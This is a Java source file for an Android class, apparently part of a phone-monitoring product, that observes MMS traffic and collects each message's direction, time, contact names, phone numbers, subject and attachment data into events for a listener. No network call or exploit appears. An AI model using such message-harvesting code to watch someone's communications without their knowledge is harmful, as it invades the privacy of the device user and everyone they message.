package com.vvt.processmms;

import java.util.ArrayList;
import java.util.List;

import android.content.Context;

import com.vvt.base.FxEvent;
import com.vvt.base.FxEventListener;
import com.vvt.events.FxAttachment;
import com.vvt.events.FxEventDirection;
import com.vvt.events.FxMMSEvent;
import com.vvt.events.FxRecipient;
import com.vvt.events.FxRecipientType;
import com.vvt.exceptions.FxNullNotAllowedException;
import com.vvt.exceptions.FxOperationNotAllowedException;
import com.vvt.logger.FxLog;
import com.vvt.mms.Customization;
import com.vvt.mms.MmsAttachment;
import com.vvt.mms.MmsData;
import com.vvt.mms.MmsObserver;
import com.vvt.mms.MmsRecipient;
import com.vvt.telephony.TelephonyUtils;

public class FxMmsCapture implements MmsObserver.OnCaptureListener {
	
	private static final String TAG = "MmsCapturer";
	
	private static final boolean VERBOSE = true;
	private static final boolean LOGV = Customization.VERBOSE ? VERBOSE : false;
	
	public static final String DATE_FORMAT = "dd/MM/yy HH:mm:ss";
	
	private FxEventListener mFxEventListner;
	private Context mContext;
	private String mWritablepath;
	private MmsObserver mMmsObserver;
	private boolean mIsWorking;
	
	public FxMmsCapture(Context context, String writablePath) {
		mContext = context;
		mWritablepath = writablePath;
		
	}
	
	public void register(FxEventListener eventListner) {
		if(LOGV) FxLog.v(TAG, "register # ENTER ...");
		this.mFxEventListner = eventListner;
		
		if(LOGV) FxLog.v(TAG, "register # EXIT ...");
	}
	
	public void unregister() throws FxOperationNotAllowedException {
		if(LOGV) FxLog.v(TAG, "unregister # ENTER ...");
		if(!mIsWorking) {
			//set the eventhandler to null to avoid memory leaks
			mFxEventListner = null;
		} else {
			throw new FxOperationNotAllowedException("Capturing is working, please call stopCapture before unregister.");
		}
		if(LOGV) FxLog.v(TAG, "unregister # EXIT ...");
	}
	
	public void startCapture() throws FxNullNotAllowedException{
		if(LOGV) FxLog.v(TAG, "startCapture # ENTER ...");
		if(mFxEventListner == null)
			throw new FxNullNotAllowedException("eventListner can not be null");
		
		if(mContext == null)
			throw new FxNullNotAllowedException("Context context can not be null");
		
		if(mWritablepath == null || mWritablepath == "")
			throw new FxNullNotAllowedException("Writablepath context can not be null or empty");
		
		if (!mIsWorking) {
			mIsWorking = true;
		
			mMmsObserver = MmsObserver.getInstance(mContext);
			mMmsObserver.setLoggablePath(mWritablepath);
			//TODO : no need because we deliver time in long type not String.
			mMmsObserver.setDateFormat(DATE_FORMAT);
			mMmsObserver.registerObserver(this);
		}
		if(LOGV) FxLog.v(TAG, "startCapture # EXIT ...");
	}
	
	public void stopCapture() {
		if(mMmsObserver != null) {
			mMmsObserver.unregisterObserver(this);
			mIsWorking = false;
		}
	}

	@Override
	public void onCapture(ArrayList<MmsData> mmses) {
		
		
		List<FxEvent> events = new ArrayList<FxEvent>();
		 FxMMSEvent mmsEvent = null;
		
		for (MmsData mms : mmses) {
			
			FxEventDirection direction = FxEventDirection.UNKNOWN;
			direction = mms.isIncoming() ? FxEventDirection.IN : FxEventDirection.OUT;
			
			String contactName = mms.getContactName();
			
			if (contactName == null || contactName.trim().length() < 1) {
				contactName = "unknown";
			}
			
			mmsEvent = new FxMMSEvent();
			mmsEvent.setDirection(direction);
			mmsEvent.setEventTime(mms.getTime());
			mmsEvent.setContactName(contactName);
			mmsEvent.setSubject(mms.getSubject());
			
			String phoneNumber = "unknown";
			if (direction == FxEventDirection.OUT) {
				List<MmsRecipient> mmsRecipients = mms.getRecipients();
				FxRecipient recipient = null;
				for(MmsRecipient r : mmsRecipients) {
					recipient = new FxRecipient();
					phoneNumber = 
						TelephonyUtils.formatCapturedPhoneNumber(r.getRecipient());
					recipient.setContactName(r.getContactName());
					recipient.setRecipient(phoneNumber);
					recipient.setRecipientType(FxRecipientType.TO);
					mmsEvent.addRecipient(recipient);
				}
			} else {
				phoneNumber = 
					TelephonyUtils.formatCapturedPhoneNumber(mms.getSenderNumber());
				mmsEvent.setSenderNumber(phoneNumber);
			}
			
			List<MmsAttachment> mmsAttachments = mms.getAttachments();
			FxAttachment attachment = null;
			for (MmsAttachment att : mmsAttachments) {
				attachment = new FxAttachment();
				attachment.setAttachemntFullName(att.getAttachmentFullName());
				attachment.setAttachmentData(att.getAttachmentData());
				mmsEvent.addAttachment(attachment);
			}
			
			events.add(mmsEvent);
		}
		
		if(events.size() > 0) {
			this.mFxEventListner.onEventCaptured(events); 
		}
	}
	
}
